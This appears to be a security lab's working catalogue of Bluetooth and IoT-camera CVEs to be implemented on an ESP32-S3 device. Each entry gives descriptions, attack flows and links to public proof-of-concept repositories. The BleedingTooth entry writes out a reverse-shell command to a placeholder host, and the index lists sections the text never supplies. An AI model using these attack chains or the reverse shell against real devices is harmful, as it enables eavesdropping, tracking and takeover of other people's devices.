# 🛡️ MASTER CVE & EXPLOIT LIST
> **Last Updated:** 2026-03-04 | **Lab:** NYKI-9Z Security Research
> **Primary Focus:** Implementation of Attack Vectors into Master Device (ESP32-S3)
> **Scope:** Bluetooth Exploits · ESP32-S3 Firmware Modifications · IoT Camera Attacks
> 
> **Connected Hardware Specs (COM7):** 
> - **Chip:** ESP32-S3 (revision v0.2)
> - **Memory:** 16MB SPI Flash (DIO, 80MHz) / 8MB Octal PSRAM
> - **Current Firmware:** `esp_idf_bridge` (Custom UART Pentest Tool)

## 📋 MASTER INDEX

| # | Exploit Name | CVE(s) | Category | PoC Files | GitHub Cloned | Lab Tested |
|---|---|---|---|---|---|---|
| 01 | [BlueDucky](#01-blueducky) | CVE-2023-45866 | BT — Zero-Click KeyInject | ✅ Yes | ✅ Yes | ⬜ No |
| 02 | [WhisperPair](#02-whisperpair) | CVE-2025-36911 | BT — Force Pair / Eavesdrop | ✅ Yes | ✅ Yes | ⬜ No |
| 03 | [BLUFFS](#03-bluffs) | CVE-2023-24023 | BT — AitM Session Key Brute | ✅ Yes | ✅ Yes | ⬜ No |
| 04 | [Airoha RACE Protocol Flaws](#04-airoha-race-protocol-flaws) | CVE-2025-20700/20701/20702 | BT — Unauth GATT/Classic | ✅ Yes | ✅ Yes | ⬜ No |
| 05 | [SweynTooth](#05-sweyntooth) | Multiple | BLE — SDK Crashes / Zero LTK | ✅ Yes | ✅ Yes | ⬜ No |
| 06 | [BrakTooth](#06-braktooth) | Multiple | BT Classic — Baseband Fuzzing | ✅ Yes | ✅ Yes | ⬜ No |
| 07 | [BlueSpy](#07-bluespy) | — | BT — Pairing Misconfig Audio | ✅ Yes | ✅ Yes | ⬜ No |
| 08 | [PerfektBlue](#08-perfektblue) | CVE-2024-45434 et al. | BT — Automotive RCE Chain | ✅ Yes | ✅ Yes | ⬜ No |
| 09 | [Android Zero-Click Nightmare](#09-android-zero-click-nightmare) | CVE-2025-48539 | BT — L2CAP Zero-Click RCE | ❌ No Public PoC | ❌ No | ⬜ No |
| 10 | [Blue's Clues — Non-Discoverable Myth](#10-blues-clues--non-discoverable-myth) | — | BT — Privacy / MAC Tracking | ⬜ Concept | ❌ No | ⬜ No |
| 11 | [Default & Hardcoded Credentials](#11-default--hardcoded-credentials) | — | IoT Camera — Auth | ✅ Technique | ❌ No | ⬜ No |
| 12 | [Command Injection — Zavio](#12-command-injection--zavio) | CVE-2023-4249 | IoT Camera — RCE | ⬜ Non-Public PoC | ❌ No | ⬜ No |
| 13 | [Command Injection — PTZOptics](#13-command-injection--ptzoptics) | CVE-2024-8957 | IoT Camera — RCE | ⬜ Unconfirmed PoC | ❌ No | ⬜ No |
| 14 | [Yi IOT Camera RCE](#14-yi-iot-camera-rce) | — (2025) | IoT Camera — RCE | ✅ Yes | ✅ Yes | ⬜ No |
| 15 | [Hikvision Auth Bypass](#15-hikvision-auth-bypass) | CVE-2017-7921 | IoT Camera — Auth Bypass | ✅ Yes | ✅ Yes | ⬜ No |
| 16 | [Victure PC420 Hardcoded Root](#16-victure-pc420-hardcoded-root) | CVE-2023-41610 | IoT Camera — Hardcoded Creds | ⬜ Concept | ❌ No | ⬜ No |
| 17 | [Ni8mare — n8n RCE](#17-ni8mare--n8n-rce) | CVE-2026-21858 | IoT Infra — Unauth RCE | ✅ Yes | ✅ Yes | ⬜ No |
| 18 | [Mozi DHT P2P Botnet](#18-mozi-dht-p2p-botnet) | — | IoT Infra — Botnet Arch | ✅ Research | ❌ No | ⬜ No |
| **19** | [**KNOB**](#19-knob) | **CVE-2019-9506** | **BT Classic — Enc Key Downgrade** | **✅ Yes** | **⬜ No** | **⬜ No** |
| **20** | [**BIAS**](#20-bias) | **CVE-2020-10135** | **BT Classic — Device Impersonation** | **✅ Yes** | **⬜ No** | **⬜ No** |
| **21** | [**BlueFrag**](#21-bluefrag) | **CVE-2020-0022** | **BT — Android Zero-Click RCE** | **✅ Yes** | **⬜ No** | **⬜ No** |
| **22** | [**BlueBorne**](#22-blueborne) | **CVE-2017-0781/0782/0785 + Linux** | **BT — Airborne Multi-OS RCE** | **✅ Yes** | **⬜ No** | **⬜ No** |
| **23** | [**BleedingTooth**](#23-bleedingtooth) | **CVE-2020-12351/12352/24490** | **BT — Linux Kernel Zero-Click RCE** | **✅ Yes** | **⬜ No** | **⬜ No** |
| **24** | [**BLEEDINGBIT**](#24-bleedingbit) | **CVE-2018-16986 / CVE-2018-7080** | **BLE — TI Chip RCE / OAD Backdoor** | **⬜ Armis Research** | **❌ No** | **⬜ No** |
| **25** | [**BLESA**](#25-blesa) | **CVE-2020-9770 (Apple)** | **BLE — Reconnection Spoofing** | **⬜ Academic** | **❌ No** | **⬜ No** |
| **26** | [**Spectra**](#26-spectra) | **CVE-2020-10368/10367/10370** | **BT/WiFi — Coexistence Inter-Chip RCE** | **⬜ InternalBlue** | **⬜ No** | **⬜ No** |
| **27** | [**ESP32 Hidden HCI Commands**](#27-esp32-hidden-hci-commands) | **CVE-2025-27840** | **ESP32 — Undocumented BT HCI Backdoor** | **✅ Yes** | **⬜ No** | **⬜ No** |

> **Legend:** ✅ = Done/Yes &nbsp;|&nbsp; ❌ = Not available/No &nbsp;|&nbsp; ⬜ = Pending

---

## 🔵 BLUETOOTH EXPLOITS & VECTORS

---

### 01 — BlueDucky
**CVE:** CVE-2023-45866  
**Type:** Zero-Click Bluetooth Keystroke Injection  
**Vector:** Bluetooth Classic (HID profile)  
**Severity:** Critical  

**Description:**  
Abuses an unauthenticated Bluetooth HID pairing flow to inject arbitrary keystrokes into an Android/Linux device with zero user interaction. The target does not need to approve anything — the device accepts the pairing because the HID spec has no mandatory authentication requirement. You achieve full keyboard injection silently.

**GitHub Repos Cloned:**
- 📁 `github-repos/BlueDucky-CVE-2023-45866/BlueDucky/` — [hackwithakki/BlueDucky](https://github.com/hackwithakki/BlueDucky)

**Lab Status:** ⬜ Not yet tested  
**Notes:** Multiple forks available. The `hackwithakki` fork is a popular ready-to-run version.

---

### 02 — WhisperPair
**CVE:** CVE-2025-36911  
**Type:** Force-Pair Bypass / Eavesdropping / Location Tracking  
**Vector:** Bluetooth LE (Fast Pair GATT)  
**Severity:** Critical (CVSS 9.x) | $15,000 Google bounty  
**Discovered by:** KU Leuven Researchers

**Description:**  
A massive logic error in Google Fast Pair — manufacturers failed to enforce the check that devices should only respond to pairing requests when *explicitly* in pairing mode. An attacker within 14 meters can silently force-pair with hundreds of millions of vulnerable wireless earbuds (Sony, JBL, Jabra, Google, Xiaomi, etc.) using commodity BLE hardware in seconds. Leads to:
- 🎧 Full audio hijacking (play at max volume, inject audio)
- 🎤 Microphone activation & silent recording
- 📍 Persistent GPS-level location tracking via Google Find Hub network

**GitHub Repos Cloned:**
- 📁 `github-repos/WhisperPair-CVE-2025-36911/wpair-app/` — [zalexdev/wpair-app](https://github.com/zalexdev/wpair-app) *(BLE scanner + exploit demo + HFP audio recording)*
- ⚠️ `aaalex954/whisperpair-poc-tool` — **404: Repo not found on GitHub** (may have been pulled)

**Lab Status:** ⬜ Not yet tested  
**Notes:** First repo (aaalex954) was removed from GitHub. wpair-app is the active tool. Official research site: whisperpair.eu

---

### 03 — BLUFFS
**CVE:** CVE-2023-24023  
**Type:** Adversary-in-the-Middle (AitM) — Session Key Downgrade  
**Vector:** Bluetooth Classic (BR/EDR)  
**Severity:** High  

**Description:**  
Forces Bluetooth session key derivation to use a short, brute-forceable key by exploiting weaknesses in the Bluetooth spec itself. The attacker positions themselves between two paired devices, manipulates the key negotiation, and brute-forces the weak key to decrypt and inject traffic in real-time.

**GitHub Repos Cloned:**
- 📁 `github-repos/BLUFFS-CVE-2023-24023/bluffs/` — [francozappa/bluffs](https://github.com/francozappa/bluffs)

**Lab Status:** ⬜ Not yet tested  
**Notes:** Spec-level flaw — affects the Bluetooth standard itself, not just a single implementation.

---

### 04 — Airoha RACE Protocol Flaws
**CVE:** CVE-2025-20700 · CVE-2025-20701 · CVE-2025-20702  
**Type:** Unauthenticated Memory Access / Device Spoofing / Link Key Exfil  
**Vector:** Bluetooth LE (GATT) + Bluetooth Classic (BR/EDR)  
**Severity:** High (CVSS 8.x)  
**Discovered by:** Dennis Heinze & Frieder Steinmetz (ERNW)

**Description:**  
Airoha's proprietary RACE (Remote Access Control Engine) protocol — designed for factory debugging — is exposed over both BLE GATT and Bluetooth Classic without authentication. The three CVEs cover:
- **CVE-2025-20700**: Missing auth for GATT BLE access → silent connect, read/write arbitrary RAM and flash
- **CVE-2025-20701**: Auth bypass for Bluetooth Classic → silent pairing without user consent
- **CVE-2025-20702**: Additional RACE protocol escalation

Chaining these flaws allows:
- 📥 Dump Link Keys from flash → impersonate the target device entirely
- 🔊 Hijack smartphone audio routing (reroute calls/music to attacker)  
- 📱 Pivot attacks against the connected smartphone

**Affects:** Millions of Airoha-powered headphones (brands include Sony, JBL, Samsung, etc.)

**GitHub Repos Cloned:**
- 📁 `github-repos/Airoha-RACE-CVE-2025-20700/race-toolkit/` — [auracast-research/race-toolkit](https://github.com/auracast-research/race-toolkit)

**Lab Status:** ⬜ Not yet tested  
**Notes:** Full disclosure paper available on GitHub. Toolkit communicates over BLE and USB.

---

### 05 — SweynTooth
**CVE:** Multiple (vendor-specific)  
**Type:** BLE SDK Crashes · Zero LTK Installation · Deadlocks  
**Vector:** Bluetooth Low Energy (BLE stack level)  
**Severity:** High  

**Description:**  
A collection of vulnerabilities across multiple BLE SDKs from major vendors (Texas Instruments, NXP, Cypress, Silabs, Nordic, etc.). Attacks include Zero LTK installation (forcing a null encryption key), crash-on-connection, and deadlock attacks. Affects embedded devices like medical devices, smart locks, routers.

**GitHub Repos Cloned:**
- 📁 `github-repos/SweynTooth/sweyntooth_bluetooth_low_energy_attacks/` — [Matheus-Garbelini/sweyntooth_bluetooth_low_energy_attacks](https://github.com/Matheus-Garbelini/sweyntooth_bluetooth_low_energy_attacks)

**Lab Status:** ⬜ Not yet tested  

---

### 06 — BrakTooth
**CVE:** Multiple  
**Type:** Bluetooth Classic Baseband/LMP Fuzzing  
**Vector:** Bluetooth Classic (BR/EDR — LMP protocol)  
**Severity:** High  

**Description:**  
Vulnerabilities in the Bluetooth Classic baseband across ~1,400 commercial devices. Fuzzing LMP (Link Manager Protocol) packets causes device crashes, infinite loops, and deadlocks. Found in chips from Qualcomm, Intel, Texas Instruments, Infineon/Cypress, and more. ESP32 is used as the attack platform.

**GitHub Repos Cloned:**
- 📁 `github-repos/BrakTooth/braktooth_esp32_bluetooth_classic_attacks/` — [Matheus-Garbelini/braktooth_esp32_bluetooth_classic_attacks](https://github.com/Matheus-Garbelini/braktooth_esp32_bluetooth_classic_attacks)

**Lab Status:** ⬜ Not yet tested  
**Notes:** Same researcher (Matheus Garbelini) as SweynTooth. Requires ESP32 as hardware attack platform.

---

### 07 — BlueSpy
**CVE:** N/A (Pairing Misconfiguration)  
**Type:** Unauthorized Audio Recording via Pairing Abuse  
**Vector:** Bluetooth Classic (A2DP / HFP profiles)  
**Severity:** Medium–High  

**Description:**  
Exploits Bluetooth speaker/headphone pairing misconfiguration. When a device is in "discoverable" or "pairable" mode (common when it has no active connection), an attacker pairs with it using the Just Works method (no PIN), connects an HFP hands-free profile, and activates the microphone. Effectively turns any unprotected Bluetooth speaker into a listening device.

**GitHub Repos Cloned:**
- 📁 `github-repos/BlueSpy/BlueSpy/` — [TarlogicSecurity/BlueSpy](https://github.com/TarlogicSecurity/BlueSpy)

**Lab Status:** ⬜ Not yet tested  

---

### 08 — PerfektBlue
**CVE:** CVE-2024-45434 + chain (Use-After-Free in AVRCP, heap overflow)  
**Type:** Remote Code Execution — Automotive Infotainment  
**Vector:** Bluetooth Classic (AVRCP profile)  
**Severity:** Critical (CVSS 8.0)  
**Discovered by:** PCA Cyber Security  

**Description:**  
A chain of Use-After-Free and memory corruption vulnerabilities in the **OpenSynergy BlueSDK** Bluetooth stack, used in vehicle infotainment systems. The exploit chain:
1. Send malformed AVRCP command → triggers UAF → memory leak
2. Use leaked address in heap overflow → plant shellcode
3. Gain shell on infotainment system (VW, Mercedes-Benz, Skoda confirmed)

Requires attacker to be within ~5–7 meters and paired (pairing requirements vary by implementation).

**GitHub Repos Cloned:**
- 📁 `github-repos/PerfektBlue-CVE-2024-45434/PerfektBlue/` — [Nour833/PerfektBlue](https://github.com/Nour833/PerfektBlue)

**Lab Status:** ⬜ Not yet tested  
**Notes:** Patches released Sept 2024, but automotive update deployment is slow due to supply chain complexity.

---

### 09 — Android Zero-Click Nightmare
**CVE:** CVE-2025-48539  
**Type:** Zero-Click Remote Code Execution via L2CAP  
**Vector:** Bluetooth (L2CAP — no pairing required)  
**Severity:** Critical  
**Patched:** September 2025 Android Security Bulletin  

**Description:**  
A Use-After-Free in `acl_arbiter.cc` (`SendPacketToPeer` function) in the Android Bluetooth stack. Broadcasting a maliciously crafted L2CAP fragmentation packet causes the Bluetooth controller to mishandle reassembly, resulting in an out-of-bounds read/write. The target device does not need to be paired, discoverable, or interacted with in any way.

- Affects: Android 15.0 and 16.0
- No user interaction required
- Works from any adjacent Bluetooth node

**GitHub Repos Cloned:** ❌ None — No public PoC exists yet  
**Lab Status:** ⬜ Not yet tested  
**Notes:** Advisory confirmed by GitHub Advisory Database but "no known source code." Patch: Update to 2025-09-01 security patch level.

---

### 10 — Blue's Clues — The Non-Discoverable Myth
**CVE:** N/A (Attack Technique)  
**Type:** Active Privacy Attack — Permanent MAC Address Exfiltration  
**Vector:** Bluetooth (regardless of discoverable mode)  
**Severity:** Medium (Privacy / Tracking)  

**Description:**  
Disproves the assumption that "Non-Discoverable" mode protects your identity. A device's **full, permanent, unique Bluetooth MAC address** can be actively extracted even when the device is set to non-discoverable mode. This enables persistent physical tracking of a target regardless of their privacy settings — because the MAC never changes unless spoofed, and it uniquely identifies the device and its owner.

**GitHub Repos Cloned:** ⬜ No direct repo — technique-level attack  
**Lab Status:** ⬜ Not yet tested  
**Notes:** Key implication: MAC address randomization (BLE) vs. fixed MAC (BT Classic). Test with `btlejuice`, `ubertooth`, or passive sniffers.

---

### 19 — KNOB
**CVE:** CVE-2019-9506  
**Type:** Encryption Key Negotiation Downgrade — Spec-Level  
**Vector:** Bluetooth Classic (BR/EDR — LMP protocol)  
**Severity:** High (CVSS 8.1)  
**Discovered by:** Daniele Antonioli, Nils Ole Tippenhauer, Kasper Rasmussen  
**Disclosed:** USENIX Security 2019  

**Description:**  
KNOB (Key Negotiation of Bluetooth) exploits a spec-level flaw in the Bluetooth BR/EDR encryption key negotiation protocol. The negotiation process has **no integrity protection**, meaning a man-in-the-middle attacker can manipulate the key entropy negotiation between two devices and force both sides to accept a 1-byte (8-bit) encryption key. The attacker then brute-forces this trivially weak key in real time, achieving full session decryption and injection.

- Every standard-compliant Bluetooth Classic device is potentially affected
- Tested against 24 unique devices from Broadcom, Qualcomm, Apple, Intel, Chicony — all were vulnerable
- Can be chained with BIAS (CVE-2020-10135) for a powerful combined attack
- Affects: BR/EDR only. BLE uses a separate key negotiation protocol.

**Attack Flow:**
1. Position as MitM between two paired devices (using InternalBlue or a Nexus 5)
2. Intercept LMP_encryption_key_size_req — reduce entropy to 1 byte
3. Both devices accept the degraded key due to missing integrity check
4. Brute force the 1-byte key in real time → full traffic decryption + injection

**GitHub Repos to Clone:**
- 🔗 [francozappa/knob](https://github.com/francozappa/knob) — Primary PoC using InternalBlue; includes E0 key validation & brute-force code
- 🔗 [u10427687/bluetooth-KNOB](https://github.com/u10427687/bluetooth-KNOB) — Mirror / alternate study fork

**Lab Status:** ⬜ Not yet tested  
**Notes:** Requires InternalBlue + a Nexus 5 or compatible Broadcom device as the attack platform. KNOB PoC is bundled inside `francozappa/knob/poc-internalblue/`. This is a fundamental spec flaw; patches change the minimum acceptable entropy threshold (≥7 bytes) but don't fix the underlying spec weakness.

---

### 20 — BIAS
**CVE:** CVE-2020-10135  
**Type:** Device Impersonation / Authentication Bypass  
**Vector:** Bluetooth Classic (BR/EDR — secure authentication)  
**Severity:** High (CVSS 8.1)  
**Discovered by:** Daniele Antonioli, Nils Ole Tippenhauer, Kasper Rasmussen  
**Disclosed:** USENIX Security 2020  

**Description:**  
BIAS (Bluetooth Impersonation AttackS) exploits a spec-level flaw in the Bluetooth BR/EDR secure authentication mechanism. The vulnerability allows an attacker to **impersonate any previously-paired Bluetooth device** — without knowing the long-term link key — and authenticate with the victim as if they were the trusted device.

The attack exploits the fact that:
- The secure authentication procedure does not mandate mutual authentication
- A master device can trigger "legacy authentication" even if the session was established with Secure Connections
- Role switching during the authentication procedure is not properly prevented

- Tested on 30 unique Bluetooth devices / 28 chips — all vulnerable at time of disclosure
- Affects: Apple, Samsung, Intel, Qualcomm, and many more
- Can be chained with KNOB (CVE-2019-9506) for encryption downgrade after impersonation

**GitHub Repos to Clone:**
- 🔗 [francozappa/bias](https://github.com/francozappa/bias) — Primary PoC; includes legacy and secure auth validation code, patched Linux kernel module

**Lab Status:** ⬜ Not yet tested  
**Notes:** Same researcher as KNOB and BLUFFS (Daniele Antonioli / francozappa). Requires InternalBlue + compatible devboard. The BIAS + KNOB combo is particularly dangerous as it allows full impersonation AND session decryption.

---

### 21 — BlueFrag
**CVE:** CVE-2020-0022  
**Type:** Zero-Click Remote Code Execution  
**Vector:** Bluetooth Classic (BR/EDR — L2CAP packet reassembly)  
**Severity:** Critical (CVSS 8.8)  
**Patched:** Android February 2020 Security Bulletin  
**Discovered by:** Jan Ruge (SEEMOO Lab, TU Darmstadt)  

**Description:**  
A zero-click heap-based buffer overflow in the Android Bluetooth stack's L2CAP packet reassembly code. The vulnerability exists in `bt_hci_packet_fragmenter.cc` where the ACL packet length field is not properly validated. Sending a malformed fragmented L2CAP packet causes a `memcpy` with a negative (unsigned overflow) length value, corrupting the heap.

- **Android 8.0 / 8.1:** Full RCE — attacker gains code execution as the Bluetooth daemon
- **Android 9.0:** Partial RCE — more difficult due to ASLR; CVE-2017-0785-style memory leak assists
- **Android 10:** Crash only — no known RCE path
- Requires knowing the target device's Bluetooth MAC address (obtainable via passive sniffing)
- No pairing, no interaction, no discoverable mode required

**GitHub Repos to Clone:**
- 🔗 [k3vinlusec/Bluefrag_CVE-2020-0022](https://github.com/k3vinlusec/Bluefrag_CVE-2020-0022) — Python scripts from original insinuator writeup + additional crash scripts
- 🔗 [Polo35/CVE-2020-0022](https://github.com/Polo35/CVE-2020-0022) — Full ARM32 RCE PoC, tested on Bouygues BBox Miami (Android TV 8.0); includes full ROP chain
- 🔗 [themmokhtar/CVE-2020-0022](https://github.com/themmokhtar/CVE-2020-0022) — ARM64 exploit PoC, tested on Pixel 3 XL
- 🔗 [leommxj/cve-2020-0022](https://github.com/leommxj/cve-2020-0022) — Stable crash PoC in C (tested on Android 8.1 Samsung Galaxy)

**Lab Status:** ⬜ Not yet tested  
**Notes:** Insinuator's full technical writeup at `insinuator.net`. The Polo35 repo is the most complete public ARM32 RCE. The memory corruption makes this unstable on ARM64 without a memory leak primitive (ASLR bypass).

---

### 22 — BlueBorne
**CVE:** CVE-2017-0781 · CVE-2017-0782 · CVE-2017-0783 · CVE-2017-0785 (Android) · CVE-2017-1000251 (Linux) · CVE-2017-1000250 (Linux SDP)  
**Type:** Airborne Zero-Click RCE / MitM / Information Disclosure  
**Vector:** Bluetooth (BR/EDR — BNEP, SDP, A2DP — no pairing or discoverable mode required)  
**Severity:** Critical (CVE-2017-0781: CVSS 8.8)  
**Discovered by:** Armis Labs (Ben Seri & Gregory Vishnepolsky)  
**Disclosed:** September 2017  

**Description:**  
BlueBorne is a family of 8 zero-day Bluetooth vulnerabilities affecting Android, Linux, Windows, and pre-iOS 10. The attack requires **no pairing, no discoverability, no user interaction** — the target device only needs Bluetooth enabled. Vulnerabilities spread "through the air" and can propagate laterally between devices in range.

**Android CVEs:**
- **CVE-2017-0785** — SDP server information leak → leaks memory addresses, used to bypass ASLR
- **CVE-2017-0781** — BNEP `bnep_data_ind` heap overflow → RCE as Bluetooth daemon
- **CVE-2017-0782** — BNEP `bnep_setup_conn_req` heap overflow → secondary RCE path
- **CVE-2017-0783** — BNEP PAN profile flaw → Man-in-the-Middle

**Linux CVEs:**
- **CVE-2017-1000251** — L2CAP stack buffer overflow → RCE (affects Samsung Gear S3, Amazon Echo)
- **CVE-2017-1000250** — SDP server info leak (mirrors Android CVE-2017-0785)

**Exploit flow (Android 7.x):**
1. Leak memory addresses using CVE-2017-0785 (SDP info leak) → defeat ASLR
2. Use CVE-2017-0781 (BNEP heap overflow) with leaked addresses → plant shellcode
3. Execute reverse shell as Bluetooth daemon (~root level permissions)

**GitHub Repos to Clone:**
- 🔗 [ArmisSecurity/blueborne](https://github.com/ArmisSecurity/blueborne) — Official Armis PoC; Android RCE (CVE-2017-0781 + 0785) and Linux RCE (CVE-2017-1000251)
- 🔗 [Alfa100001/-CVE-2017-0785-BlueBorne-PoC](https://github.com/Alfa100001/-CVE-2017-0785-BlueBorne-PoC) — Standalone CVE-2017-0785 information leak PoC
- 🔗 [ojasookert/CVE-2017-0781](https://github.com/ojasookert/CVE-2017-0781) — Standalone Android heap overflow crash PoC
- 🔗 [CrackSoft900/Blue-Borne](https://github.com/CrackSoft900/Blue-Borne) — Extended framework covering Android + Linux + BDADDR sniffer via nRF24

**Lab Status:** ⬜ Not yet tested  
**Notes:** Affects Android < September 2017 patch. Requires a CSR 8510-based USB Bluetooth adapter (for MAC address spoofing). The ArmisSecurity repo has clear install instructions. Historically significant — this class of attack directly influenced InternalBlue development and the BleedingTooth research.

---

### 23 — BleedingTooth
**CVE:** CVE-2020-12351 (BadKarma) · CVE-2020-12352 (BadChoice) · CVE-2020-24490 (BadVibes)  
**Type:** Zero-Click Remote Code Execution — Linux Kernel  
**Vector:** Bluetooth (L2CAP/A2MP/HCI — no pairing required)  
**Severity:** High–Critical (CVE-2020-12351: CVSS 8.3)  
**Discovered by:** Andy Nguyen (Google, @theflow0)  
**Affects:** Linux kernel 4.8+ (BadKarma), 4.19+ (BadVibes)  

**Description:**  
BleedingTooth is a cluster of zero-click vulnerabilities in the Linux Bluetooth subsystem discovered by Google's Andy Nguyen. An unauthenticated attacker within Bluetooth range who knows the target's BD address can achieve **arbitrary kernel code execution** — no pairing, no discoverability, no user interaction.

**Three CVEs:**
- **CVE-2020-12351 (BadKarma)** — Heap-based type confusion in `l2cap_core.c`. Sending a malicious L2CAP A2MP packet triggers a type confusion → full kernel RCE (CVSS 8.3). Linux 4.8+
- **CVE-2020-12352 (BadChoice)** — Stack info leak in `hci_event.c`. Used to leak kernel addresses and defeat KASLR, enabling reliable exploitation of BadKarma. Linux 4.19+
- **CVE-2020-24490 (BadVibes)** — Heap buffer overflow in `hci_event.c` during BLE advertising report parsing. Linux 4.19+ (requires extended advertising); lower severity solo but combinable

**Exploit chain (per Google PoC):**
1. Use BadChoice (CVE-2020-12352) to leak kernel stack addresses → defeat KASLR
2. Use BadKarma (CVE-2020-12351) to corrupt heap via type confusion → kernel code execution
3. Build ROP chain calling `run_cmd("/bin/bash -c /bin/bash </dev/tcp/IP/PORT")` → reverse shell at kernel level

**GitHub Repos to Clone:**
- 🔗 [google/security-research](https://github.com/google/security-research/tree/master/pocs/linux/bleedingtooth) — Official Google PoC (`exploit.c`); tested on Dell XPS 15 running Ubuntu 20.04, ~80% success rate

**Lab Status:** ⬜ Not yet tested  
**Notes:** Patches merged into Linux 5.10 branch Oct 2020. High relevance to any Linux device running BlueZ (Raspberry Pi, Ubuntu servers, etc.). The PoC `exploit.c` compiles with `gcc -o exploit exploit.c -lbluetooth` and spawns a reverse shell. BD address of target must be known in advance.

---

### 24 — BLEEDINGBIT
**CVE:** CVE-2018-16986 (TI BLE stack RCE) · CVE-2018-7080 (OAD firmware backdoor)  
**Type:** BLE Advertising Packet Heap Overflow → RCE / Unauthenticated OTA Firmware Flash  
**Vector:** Bluetooth Low Energy (BLE advertising beacons — no pairing required)  
**Severity:** Critical (CVSS 8.0)  
**Discovered by:** Armis Labs (Ben Seri, Dor Zusman)  
**Disclosed:** November 2018 (Black Hat Europe)  

**Description:**  
Two critical vulnerabilities in **Texas Instruments BLE chips** (CC26xx/CC13xx/CC25xx series) embedded in enterprise WiFi access points from **Cisco, Meraki, and Aruba** — the top three enterprise WiFi vendors (~70% market share). An unauthenticated attacker within Bluetooth range can achieve RCE on the enterprise access point without any prerequisites beyond Bluetooth being enabled.

**CVE-2018-16986 — BLE Advertising Heap Overflow:**
- TI BLE-STACK 2.2.1 and earlier (CC2640, CC2650) mishandles the packet length field in BLE advertising headers when upgrading from BT spec 4.2 to 5.0 — two reserved bits are not masked, allowing an overflow
- Attacker sends a series of crafted BLE advertising beacons (stored in chip memory), then sends an overflow packet
- The overflow corrupts memory on the BLE chip → RCE; attacker can pivot from BLE chip to main AP CPU
- **Fully breaks network segmentation** — attacker can access all network VLANs simultaneously
- Affected: CC2640, CC2650, CC2640R2F, CC1350 chips (in Cisco 1542/1815, Meraki MR33/MR30H/MR74/MR53E)

**CVE-2018-7080 — OAD Debug Backdoor:**
- Aruba Series 300 APs expose TI's Over-the-Air firmware Download (OAD) feature in production
- OAD uses a **hardcoded password identical across all affected Aruba APs**
- Password recoverable by sniffing a legitimate firmware update or reverse engineering the binary
- Attacker can flash arbitrary firmware to the BLE chip → complete device takeover
- Affected: Aruba 300-series access points

**GitHub Repos to Clone:**
- ❌ No public PoC code — Armis withheld weaponized PoC. Research paper and demo video at [armis.com/research/bleedingbit](https://www.armis.com/research/bleedingbit/)
- 🔗 Research / context: [Charmve/BLE-Security-Attack-Defence](https://github.com/Charmve/BLE-Security-Attack-Defence) — Includes BLEEDINGBIT in its BLE attack taxonomy

**Lab Status:** ⬜ Not yet tested  
**Notes:** Excellent vector for enterprise red team scenarios. Affected chips are extremely common — also used in medical devices (insulin pumps, pacemakers), retail payment systems, and industrial controllers. Even without a public PoC, the technical white paper is detailed enough to reconstruct the overflow manually. Requires TI CC chip and scanning mode to be active.

---

### 25 — BLESA
**CVE:** CVE-2020-9770 (Apple iOS/macOS) + unpatched Android flaw  
**Type:** BLE Reconnection Spoofing — Session Hijack  
**Vector:** Bluetooth Low Energy (BLE link-layer — device reconnection)  
**Severity:** High  
**Discovered by:** Purdue University & EPFL  
**Disclosed:** USENIX WOOT 2020  

**Description:**  
BLESA (BLE Spoofing Attack) exploits two fundamental weaknesses in the BLE reconnection specification. Once two BLE devices have previously paired, subsequent reconnections are supposed to be authenticated. BLESA demonstrates that:

1. **Spec weakness:** The BLE spec does not require the peripheral to verify the client's identity during reconnection — it's optional, not mandatory
2. **Implementation bug:** Android and iOS contain a logic bug where, if the central device fails to encrypt the connection upon reconnect, the peripheral still accepts it and allows access to secure attributes

An attacker can impersonate any paired BLE peripheral (fitness tracker, smart lock, medical device) and feed forged sensor data to the companion app. At least 46% of Android BLE apps are vulnerable due to relying solely on link-layer security.

**Attack Flow:**
1. Attacker observes legitimate BLE device advertisements
2. When the paired client's phone moves out of range and reconnects, attacker beats the real device to the connection (via jamming or faster response)
3. Impersonated peripheral skips or fails the encryption/auth setup
4. Client app accepts forged sensor data due to logic bug in BLE stack

**GitHub Repos to Clone:**
- ⬜ No dedicated standalone PoC repo — research code available in supplementary materials at USENIX WOOT 2020
- 🔗 [Charmve/BLE-Security-Attack-Defence](https://github.com/Charmve/BLE-Security-Attack-Defence) — Covers BLESA in BLE vuln taxonomy
- 🔗 [engn33r/awesome-bluetooth-security](https://github.com/engn33r/awesome-bluetooth-security) — Links to BLESA paper and resources

**Lab Status:** ⬜ Not yet tested  
**Notes:** Apple patched in iOS 14.2 (CVE-2020-9770). Android fix status is less clear — the logic bug was acknowledged but patch deployment is fragmented. Particularly relevant for BLE IoT: smart locks, wearables, medical devices, anything that reconnects silently.

---

### 26 — Spectra
**CVE:** CVE-2020-10368 (WiFi data leak via BT shared RAM) · CVE-2020-10367 (WiFi code exec via BT) · CVE-2020-10370 (BT DoS)  
**Type:** Inter-Chip Privilege Escalation — WiFi/Bluetooth Coexistence  
**Vector:** Wireless coexistence interface (SECI) between BT and WiFi cores on combo chips  
**Severity:** High (architectural; some flaws cannot be patched in firmware)  
**Discovered by:** Jiska Classen (SEEMOO Lab) & Francesco Gringoli  
**Disclosed:** DEF CON 28 / Black Hat USA 2020  

**Description:**  
Spectra is a novel attack class exploiting the **Serial Enhanced Coexistence Interface (SECI)** — a hardware bus used on Broadcom and Cypress WiFi+BT combo chips so the two wireless cores can share spectrum without colliding. Both cores run on separate ARM processors within the same die but share RAM regions for coordination.

Spectra demonstrates that code execution on the Bluetooth core (via any existing BT vulnerability) can be leveraged to:

- **CVE-2020-10368** — BT core reads WiFi traffic from shared RAM → WiFi packet data leak (architectural — unfixable by firmware)
- **CVE-2020-10367** — BT core writes to shared WiFi RAM region → code execution within the WiFi core (architectural — unfixable by firmware)
- **CVE-2020-10370** — DoS: BT core claims all spectrum resources, starving the WiFi core

This effectively means a **Bluetooth RCE becomes equivalent to a WiFi RCE** — dramatically expanding the attack surface. Code execution inside the WiFi firmware is completely invisible to the host OS and even caused kernel panics on Android and iOS during testing.

**Affected chips (hundreds of millions of devices):**
- All Broadcom BCM series combo chips (all iPhones, MacBooks, Samsung Galaxy S/Note, Google Nexus/Pixel, Raspberry Pi)
- Cypress CYW series combo chips
- Intel, MediaTek, Qualcomm, TI, Marvell, NXP also notified (similar coexistence interfaces)

**GitHub Repos to Clone:**
- 🔗 [seemoo-lab/internalblue](https://github.com/seemoo-lab/internalblue) — Core research framework used for Spectra; provides BT firmware patching, memory read/write, LMP packet injection. Note: Spectra caused Broadcom to disable RAM read/write after driver init in newer patches — check version
